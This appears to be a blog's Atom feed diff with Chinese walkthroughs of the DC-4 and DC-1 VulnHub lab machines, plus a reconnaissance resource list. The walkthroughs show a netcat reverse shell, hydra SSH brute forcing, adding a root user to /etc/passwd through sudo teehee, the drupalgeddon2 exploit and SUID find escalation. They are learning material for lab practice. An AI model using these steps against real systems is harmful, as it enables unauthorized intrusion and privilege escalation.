+        <id>https://dengdinshan.github.io/post/dc-4-ba-chang/</id>
+        <link href="https://dengdinshan.github.io/post/dc-4-ba-chang/">
+        </link>
+        <updated>2024-10-16T15:20:46.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="dc-4">DC-4</h1>
+<p>靶场下载地址  https://www.vulnhub.com/entry/dc-4,313/</p>
+<p>下载下来后是 .ova 格式，建议使用vitualbox进行搭建，vmware可能存在兼容性问题。靶场推荐使用NAT(共享)模式，桥接模式可能会造成目标过多不易识别。</p>
+<p>如果当你找不到靶机在哪的时候 可以来试试这个</p>
+<figure data-type="image" tabindex="1"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410102309171.png" alt="image-20241010230912114" loading="lazy"></figure>
+<p>步入正题</p>
+<p>kali  192.168.56.102</p>
+<p>靶机 192.168.56.108</p>
+<p>想问我怎么知道靶机ip地址？</p>
+<figure data-type="image" tabindex="2"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410102325953.png" alt="image-20241010232537897" loading="lazy"></figure>
+<p>ip地址知道了 那就来看看开放了什么端口吧</p>
+<figure data-type="image" tabindex="3"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410102327942.png" alt="image-20241010232702884" loading="lazy"></figure>
+<p>开放了80段口我们当然首先就来看看呗</p>
+<figure data-type="image" tabindex="4"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410102329297.png" alt="image-20241010232906237" loading="lazy"></figure>
+<p>使用dirseach进行一下简单的扫目</p>
+<figure data-type="image" tabindex="5"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410102332579.png" alt="image-20241010233225497" loading="lazy"></figure>
+<p>发现所有php网页都是跳转到index.php，因此无论如何都要登录进去得了。</p>
+<p>那就试试弱口令吧</p>
+<p>直接丢进burp一波爆破，爆出账号admin，密码happy</p>
+<p>登录之后发现来到了一个命令执行的界面</p>
+<figure data-type="image" tabindex="6"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410102348836.png" alt="image-20241010234810794" loading="lazy"></figure>
+<p>使用burp抓个包看看能否截获。</p>
+<figure data-type="image" tabindex="7"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410102349871.png" alt="image-20241010234924821" loading="lazy"></figure>
+<figure data-type="image" tabindex="8"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410102353179.png" alt="image-20241010235329116" loading="lazy"></figure>
+<p>发现只要修改radio的值就能修改执行的命令</p>
+<figure data-type="image" tabindex="9"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410110024832.png" alt="image-20241011002440753" loading="lazy"></figure>
+<p>试试ip+add命令</p>
+<figure data-type="image" tabindex="10"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410110028827.png" alt="image-20241011002853768" loading="lazy"></figure>
+<p>查看login.php 可以得到账号密码</p>
+<figure data-type="image" tabindex="11"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410110055325.png" alt="image-20241011005508256" loading="lazy"></figure>
+<p>以及可以查看到</p>
+<figure data-type="image" tabindex="12"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410110103127.png" alt="image-20241011010338055" loading="lazy"></figure>
+<p>由于没有写入文件的权限 决定使用命令执行漏洞nc进行反弹shell</p>
+<p>在kali上先开启侦听8080端口</p>
+<figure data-type="image" tabindex="13"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410110106120.png" alt="image-20241011010627082" loading="lazy"></figure>
+<p>再修改命令执行的命令</p>
+<p>nc 192.168.56.102 8080 -e /bin/bash</p>
+<figure data-type="image" tabindex="14"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410110114036.png" alt="image-20241011011430993" loading="lazy"></figure>
+<p>已经成功咯 来试试命令</p>
+<figure data-type="image" tabindex="15"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410110117944.png" alt="image-20241011011725904" loading="lazy"></figure>
+<p>可以看到kali中获得了shell</p>
+<p>使用python获得交互式界面</p>
+<p>python -c &quot;import pty;pty.spawn('/bin/bash')&quot;</p>
+<figure data-type="image" tabindex="16"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410110122503.png" alt="image-20241011012209469" loading="lazy"></figure>
+<p>登录进来就是www-data用户。</p>
+<p>翻阅各目录 可以在/home中找到了三个用户 其中只有jim用户中存在文件</p>
+<figure data-type="image" tabindex="17"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410110135596.png" alt="image-20241011013510554" loading="lazy"></figure>
+<figure data-type="image" tabindex="18"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410111134037.png" alt="image-20241011113442971" loading="lazy"></figure>
+<p>查看各文件  发现test.sh就是个循环四五遍的echo测试  mbox没有权限看不了 backups是一个目录</p>
+<figure data-type="image" tabindex="19"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410111139051.png" alt="image-20241011113959012" loading="lazy"></figure>
+<p>进入backups目录发现backups中有文件old_passwords.bak密码备份文件</p>
+<figure data-type="image" tabindex="20"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410111142279.png" alt="image-20241011114204241" loading="lazy"></figure>
+<p>那我们将文件保存下来进行爆破</p>
+<p>hydra -l jim -P 123.txt 192.168.56.108 ssh</p>
+<figure data-type="image" tabindex="21"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410111228657.png" alt="image-20241011122804581" loading="lazy"></figure>
+<p>爆破出jim的ssh密码为：jibril04</p>
+<p>ssh jim@192.168.56.108</p>
+<figure data-type="image" tabindex="22"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410111233162.png" alt="image-20241011123327119" loading="lazy"></figure>
+<p>直接ssh连上去。sudo -l看一下能执行什么管理员权限，结果直接sudo就没有权限。内核漏洞更是不存在。</p>
+<figure data-type="image" tabindex="23"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410111235333.png" alt="image-20241011123545293" loading="lazy"></figure>
+<p>发现有一个邮件  是来自root用户发送的</p>
+<figure data-type="image" tabindex="24"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410111234437.png" alt="image-20241011123428396" loading="lazy"></figure>
+<p>进入邮件目录   cd var/spool/mail</p>
+<figure data-type="image" tabindex="25"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410111254733.png" alt="image-20241011125452693" loading="lazy"></figure>
+<p>查看邮件</p>
+<figure data-type="image" tabindex="26"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410111255229.png" alt="image-20241011125559153" loading="lazy"></figure>
+<p>可以看到发件人的账号和密码</p>
+<p>账号：Charles</p>
+<p>密码：^xHhA&amp;hvim0y</p>
+<p>直接su 切换用户试试</p>
+<figure data-type="image" tabindex="27"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410111258542.png" alt="image-20241011125826498" loading="lazy"></figure>
+<p>成功了</p>
+<figure data-type="image" tabindex="28"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410111259415.png" alt="image-20241011125912373" loading="lazy"></figure>
+<p>查看 使用sudo运行的命令</p>
+<figure data-type="image" tabindex="29"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410111303988.png" alt="image-20241011130311933" loading="lazy"></figure>
+<p>看到一个teehee提权   查看teehee有什么用法</p>
+<figure data-type="image" tabindex="30"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410111309464.png" alt="image-20241011130914408" loading="lazy"></figure>
+<p>-a 参数可以追加文件，但不会覆盖 那我们可以用teehee写一些信息到/etc/passwd里面  在passwd中加一个root权限的用户    teehee是可以以无密码以sudo执行的</p>
+<p>/etc/passwd 内每个字段含义</p>
+<p>username:password:User</p>
+<p>ID:Group ID:comment:home directory:shell</p>
+<p>写入  echo &quot;liuliansu::0:0:::/bin/bash&quot; | sudo teehee -a /etc/passwd<br>
+<img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410111311464.png" alt="image-20241011131152422" style="zoom:200%;" /></p>
+<p>su liuliansu</p>
+<figure data-type="image" tabindex="31"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410111312193.png" alt="image-20241011131228157" loading="lazy"></figure>
+<p>就这样获取到了root权限</p>
+<p>进入root目录即可找到flag</p>
+<figure data-type="image" tabindex="32"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410111313903.png" alt="image-20241011131357821" loading="lazy"></figure>
+<p>总结</p>
+<p>用反弹shell真的是蚌埠住 ctrl+c就退回到了终端...难崩</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[信息搜集]]></title>
+        <id>https://dengdinshan.github.io/post/xin-xi-sou-ji/</id>
+        <link href="https://dengdinshan.github.io/post/xin-xi-sou-ji/">
+        </link>
+        <updated>2024-09-25T11:36:03.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="一-whois信息">一、whois信息</h2>
+<p>国外的who.is：https://who.is/</p>
+<p>站长之家：http://whois.chinaz.com/</p>
+<p>爱站：https://whois.aizhan.com/</p>
+<p>微步：https://x.threatbook.cn/</p>
+<h2 id="二-子域名">二、子域名</h2>
+<h4 id="基于dns">基于dns</h4>
+<p>（1）VirusTotal：https://www.virustotal.com/#/home/search</p>
+<p>（2）DNSdumpster：https://dnsdumpster.com/</p>
+<h4 id="基于ssl证书查询">基于SSL证书查询</h4>
+<p>（1）https://crt.sh/</p>
+<p>（2）https://censys.io/</p>
+<p>（3）https://developers.facebook.com/tools/ct/</p>
+<p>（4）https://google.com/transparencyreport/https/ct/</p>
+<h2 id="三-ip段的收集">三、IP段的收集</h2>
+<p>中国互联网信息中心 http://ipwhois.cnnic.net.cn/</p>
+<h2 id="四-开放端口探测">四、开放端口探测</h2>
+<p>namp秒了（少在本地跑）</p>
+<h2 id="五-网站架构探测">五、网站架构探测</h2>
+<p>（1）wappalyzer插件——火狐插件</p>
+<p>（2）云悉：http://www.yunsee.cn/info.html</p>
+<p>（3）查看数据包响应头</p>
+<p>（4）CMS指纹识别：http://whatweb.bugscaner.com/look/</p>
+<h2 id="六-敏感文件-敏感目录探测">六、敏感文件、敏感目录探测</h2>
+<p>敏感文件、敏感目录大概有以下几种：</p>
+<p>（1）Git</p>
+<p>（2）hg/Mercurial</p>
+<p>（3）svn/Subversion</p>
+<p>（4）bzr/Bazaar</p>
+<p>（5）Cvs</p>
+<p>（6）WEB-INF泄露</p>
+<p>（7）备份文件泄露、配置文件泄露</p>
+<h2 id="七-目标域名邮箱收集">七、目标域名邮箱收集</h2>
+<h2 id="八-waf探测">八、WAF探测</h2>
+<p>附上搜索引擎：</p>
+<p>ZoomEy：https://www.zoomeye.org/</p>
+<p>FoFa：https://fofa.so/</p>
+<p>Dnsdb：https://www.dnsdb.io/zh-cn/</p>
+<p>Shodan：https://www.shodan.io/</p>
+<p>Censys：https://censys.io/</p>
+<p>御剑全家桶：http://www.moonsec.com/post-753.html</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[DC-1靶场]]></title>
+        <id>https://dengdinshan.github.io/post/dc-1-ba-chang/</id>
+        <link href="https://dengdinshan.github.io/post/dc-1-ba-chang/">
+        </link>
+        <updated>2024-08-28T08:50:16.000Z</updated>
+        <content type="html"><![CDATA[<p>DC-1靶机渗透测试</p>
+<p>环境搭建</p>
+<p>首先在https://download.vulnhub.com/dc/DC-1.zip 下载</p>
+<p>将其导入到virtualbox</p>
+<figure data-type="image" tabindex="1"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408281707133.jpg" alt="img" loading="lazy"></figure>
+<p>调整网络设置</p>
+<figure data-type="image" tabindex="2"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408281707124.jpg" alt="img" loading="lazy"></figure>
+<p>将vmware的网络进行设置</p>
+<figure data-type="image" tabindex="3"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408281707126.jpg" alt="img" loading="lazy"></figure>
+<p>网络环境已配置好 接下来进行对于DC-1靶场的渗透测试</p>
+<p>首先是信息收集</p>
+<p>攻击机：kali ip 192.168.56.102</p>
+<p>靶机： DC-1  ip 192.168.56.106</p>
+<p>为了查看靶机ip 我们通过工具arpscan可以发现</p>
+<figure data-type="image" tabindex="4"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408281707129.jpg" alt="img" loading="lazy"></figure>
+<p>所以靶机的ip为 192.168.56.106</p>
+<p>使用nmap工具查看靶机开放端口</p>
+<figure data-type="image" tabindex="5"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408281707138.jpg" alt="img" loading="lazy"></figure>
+<p>发现开放端口有22、80、111、54973 服务有ssh、http、rpcbind、status</p>
+<p>首先来查看80端口</p>
+<figure data-type="image" tabindex="6"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408281707142.jpg" alt="img" loading="lazy"></figure>
+<p>尝试对其进行sql注入但无果</p>
+<p>使用浏览器插件wappalyzer查看其CMS版本以及名字</p>
+<figure data-type="image" tabindex="7"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408281707596.jpg" alt="img" loading="lazy"></figure>
+<p>可以看到CMS为Drupal 7</p>
+<p>接下来就是对于Drupal 7的漏洞利用</p>
+<p>msf有一些现成的模块我们可以直接利用</p>
+<p><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408281707615.jpg" alt="img" loading="lazy"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408281707638.jpg" alt="img" loading="lazy"></p>
+<p>发现 exploit/unix/webapp/drupal_drupalgeddon2可以使用</p>
+<figure data-type="image" tabindex="8"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408281707661.jpg" alt="img" loading="lazy"></figure>
+<figure data-type="image" tabindex="9"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408281707687.jpg" alt="img" loading="lazy"></figure>
+<p>可以看到session的建立</p>
+<p><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408281707708.jpg" alt="img" loading="lazy">查看DC-1基本信息</p>
+<figure data-type="image" tabindex="10"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408281707048.jpg" alt="img" loading="lazy"></figure>
+<p>获得shell</p>
+<figure data-type="image" tabindex="11"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408281707063.jpg" alt="img" loading="lazy"></figure>
+<p>ls进行查看</p>
+<figure data-type="image" tabindex="12"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408281707080.jpg" alt="img" loading="lazy"></figure>
+<p>使用python进行反弹</p>
+<p>python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'</p>
+<figure data-type="image" tabindex="13"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408281707106.jpg" alt="img" loading="lazy"></figure>
+<p>查看当前用户</p>
+<figure data-type="image" tabindex="14"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408281707131.jpg" alt="img" loading="lazy"></figure>
+<p>查看文件flag1.txt</p>
+<figure data-type="image" tabindex="15"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408281707150.jpg" alt="img" loading="lazy"></figure>
+<p>每个好的CMS都需要一个配置文件——你也是。</p>
+<p>根据提示查找配置文件</p>
+<p>cat <code>find / -name settings.php</code></p>
+<figure data-type="image" tabindex="16"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408281707317.jpg" alt="img" loading="lazy"></figure>
+<p>发现flag2</p>
+<p>文件里面有数据库的账号密码</p>
+<p>也给了提示</p>
+<p>*暴力和字典攻击不是最常见的</p>
+<p>*只有获得访问权限的方法（您将需要访问权限）。</p>
+<p>*你能用这些证书做什么？</p>
+<p>暴力破解的话想到前面80的登录框 意思应该是没办法暴力破解登录</p>
+<p>后面的意思应该是后续需要我们提权操作。</p>
+<p>尝试登录数据库</p>
+<figure data-type="image" tabindex="17"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408281707367.jpg" alt="img" loading="lazy"></figure>
+<p>查看库</p>
+<figure data-type="image" tabindex="18"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408281707386.jpg" alt="img" loading="lazy"></figure>
+<p>进入drupaldb库中</p>
+<figure data-type="image" tabindex="19"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408281707403.jpg" alt="img" loading="lazy"></figure>
+<p>查看库中的表</p>
+<figure data-type="image" tabindex="20"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408281707432.jpg" alt="img" loading="lazy"></figure>
+<p>发现有表名叫users</p>
+<p>查看其内容</p>
+<figure data-type="image" tabindex="21"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408281707450.jpg" alt="img" loading="lazy"></figure>
+<p>看不到 在末尾加上/G</p>
+<p>select * from users\G;</p>
+<p>/G 的作用是将查到的结构旋转90度变成纵向：</p>
+<figure data-type="image" tabindex="22"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408281707625.jpg" alt="img" loading="lazy"></figure>
+<p>得到两个用户</p>
+<p>| admin | <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>S</mi></mrow><annotation encoding="application/x-tex">S</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span></span></span></span>DvQI6Y600iNeXRIeEMF94Y6FvN8nujJcEDTCP9nS5.i38jnEKuDR |</p>
+<p>| Fred  | <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>S</mi></mrow><annotation encoding="application/x-tex">S</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span></span></span></span>DWGrxef6.D0cwB5Ts.GlnLw15chRRWH2s1R3QBwC0EkvBQ/9TCGg |</p>
+<p>找一下有没有加密文件</p>
+<p>地址为/var/www/scripts/password-hash.sh</p>
+<p>打开加密脚本</p>
+<p>cat /var/www/scripts/password-hash.sh</p>
+<figure data-type="image" tabindex="23"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408281707673.jpg" alt="img" loading="lazy"></figure>
+<p>这个脚本是用php写的，而且还能用php加参数运行，直接得到加密后的密码，这里我们设置一个密码123456</p>
+<figure data-type="image" tabindex="24"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408281707701.jpg" alt="img" loading="lazy"></figure>
+<p>得到加密后的密码， 接着我们登入mysql修改一下admin和Fred的密码</p>
+<figure data-type="image" tabindex="25"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408281707721.jpg" alt="img" loading="lazy"></figure>
+<p>密码修改成功</p>
+<p>进行登录</p>
+<figure data-type="image" tabindex="26"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408281707745.jpg" alt="img" loading="lazy"></figure>
+<figure data-type="image" tabindex="27"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408281707768.jpg" alt="img" loading="lazy"></figure>
+<p>在页面中寻找到了flag3</p>
+<figure data-type="image" tabindex="28"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408281707032.jpg" alt="img" loading="lazy"></figure>
+<figure data-type="image" tabindex="29"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408281707053.jpg" alt="img" loading="lazy"></figure>
+<p>得到flag3；</p>
+<p>并且获得提示：Special PERMS will help FIND the passwd - but you’ll need to -exec that command to work out how to get what’s in the shadow.</p>
+<p>根据提示passwd我们可以想到/etc/passwd</p>
+<figure data-type="image" tabindex="30"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408281707074.jpg" alt="img" loading="lazy"></figure>
+<p>切换到flag4里面看看有什么文件.</p>
+<figure data-type="image" tabindex="31"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408281707104.jpg" alt="img" loading="lazy"></figure>
+<p>查看</p>
+<figure data-type="image" tabindex="32"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408281707126.jpg" alt="img" loading="lazy"></figure>
+<p>发现权限不够。需要提权 首先试试SUID提权</p>
+<p>利用find命令，找查具有SUID权限的可执行二进制文件</p>
+<p>find / -perm -u=s -type f 2&gt;/dev/null</p>
+<figure data-type="image" tabindex="33"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408281707146.jpg" alt="img" loading="lazy"></figure>
+<p>find比较常用，可以执行root权限的命令找查文件，</p>
+<p>find / -name index.php -exec &quot;/bin/sh&quot; \</p>
+<p>查找什么文件不重要（但是是存在的文件），只需要格式对，然后后面加上</p>
+<p>-exec &quot;/bin/sh&quot; ;;</p>
+<figure data-type="image" tabindex="34"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408281707304.jpg" alt="img" loading="lazy"></figure>
+<p>可以看到已经提权成功了，接下来我们只要找到剩下的flag文件就算通关啦</p>
+<figure data-type="image" tabindex="35"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408281707411.jpg" alt="img" loading="lazy"></figure>
+<p>得到了最后的flag</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[有一些好用的小技巧]]></title>
+        <id>https://dengdinshan.github.io/post/you-yi-xie-hao-yong-de-xiao-ji-qiao/</id>
+        <link href="https://dengdinshan.github.io/post/you-yi-xie-hao-yong-de-xiao-ji-qiao/">
+        </link>
+        <updated>2024-08-28T08:22:15.000Z</updated>
+        <summary type="html"><![CDATA[<p>win+v<br>
+可以查看当前剪切板的历史记录</p>
+]]></summary>
+        <content type="html"><![CDATA[<p>win+v<br>
+可以查看当前剪切板的历史记录</p>
+<!-- more -->
+<p>PRTSC 位于键盘的右上角 可以截当前屏幕的图</p>
+]]></content>
+    </entry>
+</feed>
